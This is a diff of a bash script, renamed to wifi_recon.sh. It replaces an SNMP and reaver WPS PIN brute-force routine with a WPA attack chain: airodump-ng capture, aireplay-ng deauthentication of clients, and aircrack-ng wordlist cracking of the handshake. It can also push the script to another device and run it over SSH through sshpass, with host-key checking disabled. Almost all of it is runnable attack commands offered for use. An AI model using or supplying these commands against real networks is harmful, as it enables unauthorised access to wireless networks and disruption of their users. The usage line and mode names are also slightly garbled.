@@ -1,7 +1,7 @@
 #!/usr/bin/env bash
-# ap_scan.sh
+# wifi_recon.sh
 # Adapted with remote-vs-local execution: remote scan vs on-device via SSH
-# Usage: ./ ap_scan.sh
+# Usage: ./ wifi_recon.sh
 # Requires appropriate tools depending on mode
 
 function detect_os() {
@@ -27,11 +27,11 @@ function ensure_tool() {
 }
 
 function remote_scan() {
-  read -rp "AP IP: " TARGET
-snmpwalk -v2c -c public "$TARGET" system
-wash -i wlan0 -o ap_wps.txt
-BSSID=$(awk 'NR==2{print $1}' ap_wps.txt)
-reaver -i wlan0 -b "$BSSID" -vv
+  read -rp "Interface: " IFACE
+read -rp "BSSID: " BSSID
+airodump-ng --bssid "$BSSID" -w capture --channel 6 "$IFACE"
+aireplay-ng -0 5 -a "$BSSID" "$IFACE"
+aircrack-ng -w wordlist.txt capture-01.cap
 
 }
 
@@ -40,8 +40,8 @@ function remote_ssh_execute() {
   local user="$SSH_USER"
   local pass="$SSH_PASS"
   echo "[*] Copying script and executing on-device via SSH"
-  scp "$0" "$user@$host:/tmp/ap_scan.sh"
-  sshpass -p "$pass" ssh -o StrictHostKeyChecking=no "$user@$host" "bash /tmp/ap_scan.sh on-device"
+  scp "$0" "$user@$host:/tmp/wifi_recon.sh"
+  sshpass -p "$pass" ssh -o StrictHostKeyChecking=no "$user@$host" "bash /tmp/wifi_recon.sh on-device"
 }
 
 # Main
@@ -60,10 +60,9 @@ if [[ "$MODE" == "2" ]]; then
   exit 0
 else
   # perform remote scan
-  ensure_tool nmap
-ensure_tool snmpwalk
-ensure_tool wash
-ensure_tool reaver
+  ensure_tool airodump-ng
+ensure_tool aireplay-ng
+ensure_tool aircrack-ng
   remote_scan
   exit 0
 fi
